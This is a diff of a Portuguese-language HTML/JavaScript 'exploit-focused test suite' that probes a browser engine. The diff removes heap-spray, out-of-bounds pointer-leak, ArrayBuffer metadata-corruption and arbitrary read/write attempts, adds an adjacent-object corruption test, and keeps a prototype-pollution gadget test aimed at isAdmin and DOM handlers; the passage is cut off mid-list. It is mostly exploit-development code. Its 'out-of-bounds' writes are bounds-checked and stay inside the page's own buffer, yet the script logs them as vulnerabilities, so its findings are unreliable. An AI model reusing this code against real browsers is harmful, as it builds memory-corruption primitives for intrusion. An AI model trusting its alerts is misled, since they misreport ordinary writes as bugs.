@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Suite de Testes Focada em Exploit (v19.5)</title>
+    <title>Suite de Testes Focada em Exploit (v19.6)</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output {
@@ -43,29 +43,27 @@
     </style>
 </head>
 <body>
-    <h1>Suite de Testes Focada em Exploit (v19.5)</h1>
-    <p>Foco: OOB Read/Leak (Spray Agressivo), OOB Write (Metadata), Arbitrary R/W Test, PP Avançada/Gadgets, Hijack+OOB Interaction.</p>
-    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.5)</button>
+    <h1>Suite de Testes Focada em Exploit (v19.6)</h1>
+    <p>Foco: OOB Write (Corrupção Adjacente), PP Avançada/Gadgets.</p>
+    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.6)</button>
     <div id="output"></div>
     <hr>
     <div id="summary"></div>
 
     <script>
-        // --- Script Focado em Exploit (v19.5) ---
+        // --- Script Focado em Exploit (v19.6) ---
         const outputDiv = document.getElementById('output');
         const runBtn = document.getElementById('runBtn');
         const SHORT_PAUSE = 50;
         const MEDIUM_PAUSE = 500;
-        let leakedValueFromOOB = null; // Armazena { high, low, type, offset }
         let findings = []; // Array único para todos os findings
-        let corruptedMetadataBuffer = null; // Armazena buffer corrompido
 
         const IMPORTANT_LOG_TYPES = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];
 
         // Função log (v19.4)
         const log = (message, type = 'info', funcName = '') => {
             let keepLog = IMPORTANT_LOG_TYPES.includes(type);
-             if (!keepLog && type === 'good') { const lowerMsg = String(message).toLowerCase(); if (lowerMsg.includes('bloqueado') || lowerMsg.includes('falhou') || lowerMsg.includes('não afetou') || lowerMsg.includes('não encontrado') || lowerMsg.includes('não suportado') || lowerMsg.includes('não disponível') || lowerMsg.includes('nenhum leak') || lowerMsg.includes('nenhuma corrupção detectada') || lowerMsg.includes('sem erro') || lowerMsg.includes('não corrompido') || lowerMsg.includes('wasm não suportado') || lowerMsg.includes('nenhum objeto atingido')) { keepLog = true; } }
+             if (!keepLog && type === 'good') { const lowerMsg = String(message).toLowerCase(); if (lowerMsg.includes('bloqueado') || lowerMsg.includes('falhou') || lowerMsg.includes('não afetou') || lowerMsg.includes('não encontrado') || lowerMsg.includes('não suportado') || lowerMsg.includes('não disponível') || lowerMsg.includes('nenhum leak') || lowerMsg.includes('nenhuma corrupção detectada') || lowerMsg.includes('sem erro') || lowerMsg.includes('não corrompido') || lowerMsg.includes('wasm não suportado') || lowerMsg.includes('nenhum objeto atingido') || lowerMsg.includes('não parece ter sido afetado')) { keepLog = true; } } // Added more 'good' cases
             if (!keepLog) return;
             if (!outputDiv) return; try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if (['vuln', 'critical', 'escalation', 'ptr', 'leak'].includes(type)) { findings.push({ type, funcName, message: sanitizedMessage, time: timestamp }); } if(outputDiv.innerHTML.length > 800000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 400000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error("Erro na função log:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
         };
@@ -73,255 +71,202 @@
         // Funções Helper (v19.0)
         const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
         const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
-        // Ajustado para ser menos restritivo com padrões, mas ainda evitar nulos/FF/AA/BB/EE
-        const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; const high_u = high >>> 0; const low_u = low >>> 0; if (high_u === 0xFFFFFFFF && low_u === 0xFFFFFFFF) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAAA) return false; if (high_u === 0xBBBBBBBB && low_u === 0xBBBBBBBB) return false; if (high_u === 0xAAAAAAEE && low_u === 0xAAAAAAAA) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAEE) return false; if (high_u === 0xBBBBBBEE && low_u === 0xBBBBBBBB) return false; if (high_u === 0xBBBBBBBB && low_u === 0xBBBBBBEE) return false; if (high === 0 && low < 0x100000) return false; return true; }; // Ainda checa ponteiros baixos
-        const isPotentialData32 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE || val === 0xBBBBBBBB || val === 0xBBBBBBEE) return false; if (val < 0x1000) return false; return true; };
+        // Removidas funções de leak OOB Read, pois não funcionaram e não são o foco aqui
 
-        // --- Testes Prioritários (v19.5) ---
+        // --- Testes Prioritários (v19.6) ---
 
-        // 1. Teste de Leitura OOB / Vazamento de Info (v19.5 com Spray Misto e Leitura Ampla)
-        const testOOBReadInfoLeak = async () => {
-            const FNAME = 'testOOBReadInfoLeak';
-            log("--- Iniciando Teste 1: OOB Write/Read (Leak c/ Spray Misto) ---", 'test', FNAME);
-            const bufferSize = 64;
-            const writeValue = 0xEE; const oobWriteOffset = bufferSize;
-            const readRangeStart = -192; const readRangeEnd = bufferSize + 192; // Faixa de leitura aumentada
-            const allocationSize = bufferSize + 512; // Buffer de controle maior para acomodar leitura
-            const baseOffsetInBuffer = 256; // Centralizado
-            const sprayTotalCount = 500; // Total de elementos no spray
-            const sprayObjectsCount = 250; // Metade objetos simples
-            const sprayFloatCount = sprayTotalCount - sprayObjectsCount; // Metade Float64Arrays
-            const floatArraySize = 8;
-            const sprayedElements = []; // Array único para o spray
+        // 1. v19.6: Novo Teste - OOB Write para Corrupção Adjacente
+        const testAdjacentCorruption = async () => {
+            const FNAME = 'testAdjacentCorruption';
+            log("--- Iniciando Teste 1: OOB Write para Corrupção Adjacente ---", 'test', FNAME);
+            const controlBufferSize = 64;
+            const allocationSize = controlBufferSize + 256; // Buffer de controle
+            const baseOffsetInBuffer = 128;
+            const oobWriteValue32 = 0xDEADBEEF; // Valor 32-bit a escrever
+            const oobWriteValue64_High = 0x41424344; // ABCD
+            const oobWriteValue64_Low = 0x45464748;  // EFGH
+            let controlBuffer = null;
+            let dv = null;
+            let oobWriteSuccessCount = 0;
+            let adjacentHit = false;
 
-            const oobReadOffsets = [];
-            for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); }
-            let writeSuccess = false; let potentialLeakFoundCount = 0;
-            leakedValueFromOOB = null; // Resetar leak global
+            // Offsets OOB (relativos ao fim do buffer de controle) para tentar escrever
+            // Inclui offsets pequenos (logo após) e maiores
+            const oobOffsetsToWrite = [-8, -4, 0, 4, 8, 16, 32, 64, 128];
 
-            try {
-                // --- v19.5: Spray Misto ---
-                log(`Realizando spray de ${sprayObjectsCount} objetos e ${sprayFloatCount} Float64Arrays...`, 'info', FNAME);
-                // Spray de Objetos
-                for (let i = 0; i < sprayObjectsCount; i++) {
-                    sprayedElements.push({ marker: 0x4F4F0000 + i, data: 0xCCCCCCCC }); // 'OO' + i, data CCCCCCCC
-                }
-                // Spray de Float64Arrays
-                for (let i = 0; i < sprayFloatCount; i++) {
-                    try {
-                        const faBuffer = new ArrayBuffer(floatArraySize * 8);
-                        const fa = new Float64Array(faBuffer);
-                        fa[0] = i + 0.5; // Usar floats para diferenciar dos índices de objetos
-                        sprayedElements.push(fa);
-                    } catch (e) { log(`Erro spray Float64Array ${i}: ${e.message}`, 'warn', FNAME); }
-                }
-                log(`Spray concluído (${sprayedElements.length} elementos).`, 'info', FNAME);
-                await PAUSE(MEDIUM_PAUSE); // Pausa maior após spray
+            for (let attempt = 0; attempt < 5; attempt++) { // Tentar algumas vezes com alocações diferentes
+                log(`Tentativa ${attempt + 1}/5...`, 'subtest', FNAME);
+                let targetArrayBuffer = null;
+                let targetFloatArray = null;
+                let targetObject = null;
 
-                // --- Alocação do buffer de controle ---
-                const buffer = new ArrayBuffer(allocationSize);
-                const dataView = new DataView(buffer);
-                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xDD); } // Padrão DD
+                try {
+                    // --- Alocar Buffer de Controle e Alvos Adjacentes ---
+                    controlBuffer = new ArrayBuffer(allocationSize);
+                    dv = new DataView(controlBuffer);
+                    for(let i=0; i<controlBuffer.byteLength; i++) dv.setUint8(i, 0xCC); // Padrão CC
 
-                const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset;
-                await PAUSE();
+                    // Alocar alvos imediatamente após
+                    targetArrayBuffer = new ArrayBuffer(128); // Alvo 1: Outro ArrayBuffer
+                    targetFloatArray = new Float64Array(16);  // Alvo 2: Float64Array
+                    targetObject = { name: "target", value: 0xBBBBBBBB }; // Alvo 3: Objeto simples
 
-                // Tentar escrita OOB simples
-                try { dataView.setUint8(writeTargetAddress, writeValue); log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME); log(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME); writeSuccess = true; } catch (e) { log(`Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME); log(`--- Teste 1 Concluído (Escrita OOB Falhou) ---`, 'test', FNAME); return false; }
+                    // Preencher alvos com padrões conhecidos
+                    try { new Uint8Array(targetArrayBuffer).fill(0xAA); } catch(e){}
+                    try { targetFloatArray.fill(1.2345 + attempt); } catch(e){}
 
-                await PAUSE();
+                    await PAUSE(SHORT_PAUSE); // Pausa após alocações
 
-                // Tentar leitura OOB na faixa ampla
-                log(`Tentando leitura OOB na faixa [${readRangeStart}, ${readRangeEnd})...`, 'info', FNAME);
-                const tempReadView = new DataView(new ArrayBuffer(8));
-                for (const readOffset of oobReadOffsets) {
-                    const readTargetAddress = baseOffsetInBuffer + readOffset;
-                    const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`;
+                    // --- Tentar Escrita OOB em Vários Offsets ---
+                    log(`Tentando escrita OOB em ${oobOffsetsToWrite.length} offsets...`, 'info', `${FNAME}-Attempt${attempt+1}`);
+                    let currentAttemptHit = false;
 
-                    // Tentar ler como U64
-                    if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) {
+                    for (const offset of oobOffsetsToWrite) {
+                        const targetWriteAddr32 = baseOffsetInBuffer + controlBufferSize + offset;
+                        const targetWriteAddr64 = targetWriteAddr32; // Assumir alinhamento para 64 bits
+                        const relOffsetStr = `ctrlEnd+${offset}`;
+                        let write32OK = false;
+                        let write64OK = false;
+
+                        // Tentar escrita 32-bit
                         try {
-                            const low = dataView.getUint32(readTargetAddress, true);
-                            const high = dataView.getUint32(readTargetAddress + 4, true);
-
-                            // Ignorar padrão de preenchimento DD
-                            if (high === 0xDDDDDDDD && low === 0xDDDDDDDD) continue;
-
-                            // Interpretar como double para checar padrão do spray Float64
-                            tempReadView.setUint32(0, low, true); tempReadView.setUint32(4, high, true);
-                            const doubleVal = tempReadView.getFloat64(0, true);
-                            if (doubleVal >= 0.5 && doubleVal < (sprayFloatCount + 0.5) && (doubleVal * 10) % 10 === 5) {
-                                log(` -> Spray Double? ${doubleVal.toFixed(1)} ${relOffsetStr}: H=${toHex(high)} L=${toHex(low)}`, 'leak', FNAME); potentialLeakFoundCount++; if (leakedValueFromOOB === null) { leakedValueFromOOB = { high, low, type: 'F64_SPRAY', offset: readOffset }; log(` -> VALOR SPRAY F64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); }
+                            if(targetWriteAddr32 >= 0 && targetWriteAddr32 + 4 <= controlBuffer.byteLength){
+                                dv.setUint32(targetWriteAddr32, oobWriteValue32, true);
+                                oobWriteSuccessCount++;
+                                write32OK = true;
+                                // Restaurar imediatamente para isolar o teste de 64 bits
+                                try { dv.setUint32(targetWriteAddr32, 0xCCCCCCCC, true); } catch(e){}
                             }
-                            // Checar se é ponteiro potencial
-                            else if (isPotentialPointer64(high, low)) {
-                                const vStr = `H=${toHex(high)} L=${toHex(low)}`;
-                                log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME); potentialLeakFoundCount++; if (leakedValueFromOOB === null) { leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset }; log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}: H=${toHex(high)}, L=${toHex(low)}.`, 'vuln', FNAME); log(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME); }
-                            }
-                            // Checar se é um dos marcadores de objeto 'OO' + i
-                            else if (high === 0x4F4F0000 && low < sprayObjectsCount) {
-                                log(` -> Spray Object Marker? ${toHex(high)}${toHex(low).substring(2)} ${relOffsetStr}`, 'leak', FNAME); potentialLeakFoundCount++;
-                            }
-                             // Logar qualquer outra coisa que não seja padrão DD
-                             else if (!(high === 0xDDDDDDDD && low === 0xDDDDDDDD)) {
-                                 log(` -> Dado U64? ${relOffsetStr}: H=${toHex(high)} L=${toHex(low)}`, 'leak', FNAME); potentialLeakFoundCount++;
-                             }
+                        } catch(e) { log(` -> Escrita OOB U32 FALHOU/Bloqueada em ${relOffsetStr}: ${e.message}`, 'good', `${FNAME}-WriteLoop`); }
 
-                        } catch (e) {}
-                    }
-
-                    // Tentar ler como U32
-                    if (leakedValueFromOOB === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) {
+                        // Tentar escrita 64-bit
                         try {
-                            const val32 = dataView.getUint32(readTargetAddress, true);
-                            if (val32 !== 0xDDDDDDDD) { // Ignorar padrão DD
-                                // Checar se é marcador de objeto 'OO' + i
-                                if ((val32 & 0xFFFF0000) === 0x4F4F0000 && (val32 & 0xFFFF) < sprayObjectsCount) {
-                                     log(` -> Spray Object Marker? U32 ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME); potentialLeakFoundCount++;
-                                }
-                                // Checar se é o dado CCCCCCCC dos objetos
-                                else if (val32 === 0xCCCCCCCC) {
-                                     log(` -> Spray Object Data? U32 ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME); potentialLeakFoundCount++;
-                                }
-                                // Checar se é um dado potencial geral
-                                else if (isPotentialData32(val32)) {
-                                    log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME); potentialLeakFoundCount++; leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset }; log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}: ${toHex(val32)}.`, 'vuln', FNAME); log(` ---> *** ALERTA: Potencial Vazamento Info OOB Read U32 ***`, 'escalation', FNAME);
-                                }
-                                // Checar se leu o valor escrito OOB
-                                else if (readOffset === oobWriteOffset && val32 === (writeValue | (0xDD << 8) | (0xDD << 16) | (0xDD << 24))) {
-                                    log(` -> Leu valor OOB escrito (${toHex(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME);
-                                }
-                                // Logar qualquer outra coisa não padrão
-                                else {
-                                     log(` -> Dado U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME); potentialLeakFoundCount++;
-                                }
+                            if(targetWriteAddr64 >= 0 && targetWriteAddr64 + 8 <= controlBuffer.byteLength){
+                                dv.setUint32(targetWriteAddr64 + 4, oobWriteValue64_High, true); // High
+                                dv.setUint32(targetWriteAddr64, oobWriteValue64_Low, true);     // Low
+                                oobWriteSuccessCount++;
+                                write64OK = true;
+                                // Restaurar imediatamente
+                                try { dv.setUint32(targetWriteAddr64 + 4, 0xCCCCCCCC, true); } catch(e){}
+                                try { dv.setUint32(targetWriteAddr64, 0xCCCCCCCC, true); } catch(e){}
                             }
-                        } catch (e) {}
-                    }
-                    if (readOffset % 64 === 0) await PAUSE(5); // Pausa um pouco maior devido ao range
-                }
-            } catch (e) { log(`Erro fatal no Teste 1: ${e.message}`, 'error', FNAME); console.error(e); }
-            finally { sprayedElements.length = 0; const leakStatus = leakedValueFromOOB ? `1 valor ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset} (H=${toHex(leakedValueFromOOB.high)}, L=${toHex(leakedValueFromOOB.low)})` : 'nenhum valor armazenado'; log(`--- Teste 1 Concluído (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME); }
-            return writeSuccess;
-        };
+                        } catch(e) { log(` -> Escrita OOB U64 FALHOU/Bloqueada em ${relOffsetStr}: ${e.message}`, 'good', `${FNAME}-WriteLoop`); }
 
-        // 2. Teste de Escrita OOB (Metadata - v19.5 com Spray Maior)
-        const testOOBWriteMetadata = async () => {
-            const FNAME = 'testOOBWriteMetadata';
-            log("--- Iniciando Teste 2: OOB Write -> Metadata (Spray Aumentado) ---",'test', FNAME);
-            corruptedMetadataBuffer = null; // Resetar
-            const controlBufferSize=64; const targetBufferSize=64; // Mantido por enquanto
-            const sprayCount=200; // Aumentado spray dos alvos
-            const targetValue=0x7FFFFFFE; const targetBuffers=[]; let controlBuffer=null; let dv=null;
-            let writeSuccessCount = 0; let corruptionSuccess = false;
-            const allocationSize = controlBufferSize + 256; const baseOffsetInBuffer = 128;
-            let foundOffset=-1; let finalResultLog = `AVISO: Escrita OOB realizada (${writeSuccessCount}x), mas nenhuma corrupção de byteLength detectada.`;
-            try{ controlBuffer=new ArrayBuffer(allocationSize); dv=new DataView(controlBuffer); for(let i=0; i<controlBuffer.byteLength; i++)dv.setUint8(i, 0xDD); }catch(e){ log(`Erro fatal alocar buffer ctrl: ${e.message}`, 'error', FNAME); return; }
-            log(`Alocando ${sprayCount} buffers alvo de ${targetBufferSize} bytes...`, 'info', FNAME);
-            for(let i=0; i<sprayCount; i++){ try{ targetBuffers.push(new ArrayBuffer(targetBufferSize)); }catch(e){}}
-            await PAUSE(SHORT_PAUSE); // Pausa curta após spray
-            const metadataOffsetsToTry=[-8, -4, 0, 4, 8, 12, 16, 20, 24, 28, 32]; // Mantido
-            for(const tryOffset of metadataOffsetsToTry){
-                const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + tryOffset;
-                const relOffsetStr = `ctrlEnd+${tryOffset} (addr ${targetWriteAddr})`;
-                // Log menos verboso dentro do loop
-                // log(`Tentando offset OOB metadata: ${tryOffset}... Addr: ${targetWriteAddr}`, 'info', FNAME);
-                let currentWriteOK=false;
-                try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, targetValue, true); writeSuccessCount++; currentWriteOK=true; /* log(` -> Escrita OOB U32 em ${relOffsetStr} parece OK.`, 'info', FNAME); */ } else { /* log(` -> Offset OOB ${relOffsetStr} fora dos limites do buffer de controle.`, 'warn', FNAME); */ } }catch(e){ /* log(` -> Escrita OOB U32 falhou/bloqueada em ${relOffsetStr}: ${e.message}`, 'good', FNAME); */ }
-                if(currentWriteOK){
-                    // log(` -> Verificando ${targetBuffers.length} buffers alvo...`, 'info', FNAME);
-                    // Pausa menor aqui, pois a verificação é rápida
-                    await PAUSE(1);
-                    for(let j=0; j<targetBuffers.length; j++){
-                        try { const currentLength = targetBuffers[j]?.byteLength; if(currentLength === targetValue){ log(`---> VULN: ArrayBuffer alvo ${j} teve byteLength CORROMPIDO para ${toHex(targetValue)} com escrita OOB em ${relOffsetStr}! <---`, 'critical', FNAME); log(` ---> *** ALERTA: Primitivo Relevante (Corrupção Metadados OOB Write -> R/W Poderoso) ***`, 'escalation', FNAME); corruptionSuccess=true; foundOffset=tryOffset; finalResultLog = `SUCESSO! byteLength corrompido usando offset relativo ctrlEnd+${foundOffset}.`;
-                                corruptedMetadataBuffer = targetBuffers[j]; log(`   -> Buffer ${j} corrompido ARMAZENADO para teste R/W posterior.`, 'info', FNAME);
-                                try{ const corruptedView=new DataView(targetBuffers[j]); const readOOBAddr = targetBufferSize + 4; const readOOBValue = corruptedView.getUint32(readOOBAddr, true); log(`  -> Leitura OOB via AB ${j} corrompido @ offset ${readOOBAddr}: ${toHex(readOOBValue)}`, 'leak', FNAME); log(` ---> *** ALERTA: Leitura OOB confirmada usando buffer corrompido! ***`, 'escalation', FNAME); }catch(eRead){ log(`  -> Erro ao tentar leitura OOB via AB ${j} corrompido: ${eRead.message}`, 'warn', FNAME); }
-                                break; } } catch(eCheck) { /* log(`Erro ao verificar buffer alvo ${j}: ${eCheck.message}`, 'error', FNAME); */ } // Silenciar erros de verificação individuais
-                    }
-                    try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, 0xDDDDDDDD, true); } }catch(eRestore){}
+                        if (write32OK || write64OK) {
+                           // Se a escrita OOB funcionou, agora checamos os alvos adjacentes
+                           // É mais provável que a escrita tenha ocorrido *durante* o dv.setUint32/64
+                           // Então, re-escrevemos e verificamos imediatamente
+
+                           // Re-escrever 32-bit e verificar
+                           if(targetWriteAddr32 >= 0 && targetWriteAddr32 + 4 <= controlBuffer.byteLength){
+                               try {
+                                   dv.setUint32(targetWriteAddr32, oobWriteValue32, true);
+                                   // Verificar Alvo 1 (ArrayBuffer)
+                                   if (targetArrayBuffer.byteLength !== 128) { log(`---> VULN: targetArrayBuffer.byteLength CORROMPIDO para ${targetArrayBuffer.byteLength} por escrita OOB @ ${relOffsetStr}!`, 'critical', FNAME); currentAttemptHit = true; }
+                                   // Verificar Alvo 3 (Objeto)
+                                   if (targetObject.value === oobWriteValue32) { log(`---> VULN: targetObject.value CORROMPIDO para ${toHex(oobWriteValue32)} por escrita OOB @ ${relOffsetStr}!`, 'critical', FNAME); currentAttemptHit = true; }
+                                   // Restaurar
+                                   try { dv.setUint32(targetWriteAddr32, 0xCCCCCCCC, true); } catch(e){}
+                               } catch(e){}
+                           }
+
+                           // Re-escrever 64-bit e verificar
+                           if(targetWriteAddr64 >= 0 && targetWriteAddr64 + 8 <= controlBuffer.byteLength){
+                               try {
+                                   dv.setUint32(targetWriteAddr64 + 4, oobWriteValue64_High, true);
+                                   dv.setUint32(targetWriteAddr64, oobWriteValue64_Low, true);
+                                   // Verificar Alvo 2 (Float64Array) - Checar se o primeiro elemento foi sobrescrito
+                                   if (targetFloatArray[0] !== (1.2345 + attempt)) { log(`---> VULN: targetFloatArray[0] CORROMPIDO (era ${1.2345+attempt}, virou ${targetFloatArray[0]}) por escrita OOB @ ${relOffsetStr}!`, 'critical', FNAME); currentAttemptHit = true; }
+                                   // Restaurar
+                                   try { dv.setUint32(targetWriteAddr64 + 4, 0xCCCCCCCC, true); } catch(e){}
+                                   try { dv.setUint32(targetWriteAddr64, 0xCCCCCCCC, true); } catch(e){}
+                               } catch(e){}
+                           }
+                        }
+                        if (currentAttemptHit) {
+                            adjacentHit = true; // Marcar que houve sucesso em alguma tentativa
+                            log(`   -> Corrupção adjacente detectada na tentativa ${attempt + 1} com offset ${offset}!`, 'vuln', FNAME);
+                             break; // Parar de testar offsets nesta tentativa se já achou corrupção
+                        }
+                        await PAUSE(5); // Pausa entre offsets
+                    } // Fim loop offsets
+
+                } catch (e) {
+                    log(`Erro na tentativa ${attempt + 1}: ${e.message}`, 'error', FNAME);
+                } finally {
+                    // Limpar referências para ajudar GC
+                    controlBuffer = null; dv = null;
+                    targetArrayBuffer = null; targetFloatArray = null; targetObject = null;
                 }
-                if(corruptionSuccess) break;
-                // Pausa curta entre offsets
-                await PAUSE(5);
+                if (adjacentHit) break; // Parar tentativas se já houve sucesso
+                await PAUSE(SHORT_PAUSE); // Pausa entre tentativas
+            } // Fim loop tentativas
+
+            if (adjacentHit) {
+                log(`SUCESSO: Escrita OOB conseguiu corromper dados/metadados de objeto adjacente!`, 'vuln', FNAME);
+                log(` ---> *** ALERTA: Primitivo Relevante (OOB Write com Efeito Observável no Heap) ***`, 'escalation', FNAME);
+            } else {
+                if (oobWriteSuccessCount > 0) {
+                     log(`Escrita OOB realizada ${oobWriteSuccessCount} vezes, mas nenhuma corrupção adjacente detectada.`, 'warn', FNAME);
+                } else {
+                     log(`Escrita OOB falhou/bloqueada. Nenhuma corrupção adjacente detectada.`, 'good', FNAME);
+                }
             }
-            if (!corruptionSuccess && writeSuccessCount === 0) { finalResultLog = `Escrita OOB falhou/bloqueada em todos os offsets testados.`; log(finalResultLog, 'good', FNAME); } else { log(finalResultLog, corruptionSuccess ? 'vuln' : 'warn', FNAME); }
-            log("--- Teste 2 Concluído ---",'test', FNAME);
-            await PAUSE();
-        };
 
-        // 3. Teste para usar o buffer corrompido (Inalterado v19.3)
-        const testArbitraryRW = async () => {
-            const FNAME = 'testArbitraryRW';
-            log("--- Iniciando Teste 3: Tentativa de R/W Arbitrário ---", 'test', FNAME);
-            if (!corruptedMetadataBuffer) { log("Nenhum buffer corrompido encontrado no Teste 2. Pulando.", 'good', FNAME); log("--- Teste 3 Concluído (Pulado) ---", 'test', FNAME); return; }
-            log(`Buffer corrompido encontrado! Tentando R/W arbitrário...`, 'info', FNAME);
-            const originalSize = 64;
-            try {
-                const corruptedView = new DataView(corruptedMetadataBuffer);
-                const arbitraryReadOffset = originalSize + 100; const arbitraryWriteOffset = originalSize + 200; const writeVal = 0xBADCAFE0;
-                try { const readValue = corruptedView.getUint32(arbitraryReadOffset, true); log(` -> LEITURA ARBITRÁRIA OK @ offset ${arbitraryReadOffset}: ${toHex(readValue)}`, 'leak', FNAME); log(` ---> *** ALERTA: Primitiva Arbitrary Read CONFIRMADA! ***`, 'escalation', FNAME); } catch (eReadArb) { log(` -> FALHA Leitura Arbitrária @ offset ${arbitraryReadOffset}: ${eReadArb.message}`, 'error', FNAME); }
-                await PAUSE(SHORT_PAUSE);
-                try { corruptedView.setUint32(arbitraryWriteOffset, writeVal, true); log(` -> ESCRITA ARBITRÁRIA OK @ offset ${arbitraryWriteOffset} (valor ${toHex(writeVal)})`, 'vuln', FNAME); try { const readBack = corruptedView.getUint32(arbitraryWriteOffset, true); if (readBack === writeVal) { log(` -> Confirmação R/W Arbitrário: Leu ${toHex(readBack)} de volta.`, 'vuln', FNAME); log(` ---> *** ALERTA: Primitiva Arbitrary Read/Write CONFIRMADA! ***`, 'escalation', FNAME); } else { log(` -> FALHA Confirmação R/W Arbitrário: Leu ${toHex(readBack)} != ${toHex(writeVal)}`, 'warn', FNAME); } } catch(eReadBack) { log(` -> FALHA Leitura para Confirmação R/W Arbitrário: ${eReadBack.message}`, 'error', FNAME); } } catch (eWriteArb) { log(` -> FALHA Escrita Arbitrária @ offset ${arbitraryWriteOffset}: ${eWriteArb.message}`, 'error', FNAME); }
-            } catch (eUseCorrupted) { log(` -> Erro GERAL ao tentar usar buffer corrompido: ${eUseCorrupted.message}`, 'error', FNAME); }
-            log("--- Teste 3 Concluído ---", 'test', FNAME);
-            await PAUSE();
+            log(`--- Teste 1 Concluído (Corrupção Adjacente: ${adjacentHit ? 'Sim' : 'Não'}) ---`, 'test', FNAME);
+            return adjacentHit;
         };
 
 
-        // 4. Teste de PP Avançada / Gadgets (Inalterado v19.0)
+        // Teste 2: PP Avançada / Gadgets (Inalterado v19.0 - Renumerado)
         const testAdvancedPP = async () => {
             const FNAME = 'testAdvancedPP';
-            log("--- Iniciando Teste 4: PP Avançado (Gadgets++) ---", 'test', FNAME);
+            log("--- Iniciando Teste 2: PP Avançado (Gadgets++) ---", 'test', FNAME);
             const propsToPollute = [ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'hasOwnProperty', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => { try{({}).hasOwnProperty('a'); return null;} catch(e){ return `Object.hasOwnProperty quebrou! ${e.message}`;} } }, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'outerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'textContent', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div') }, { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: 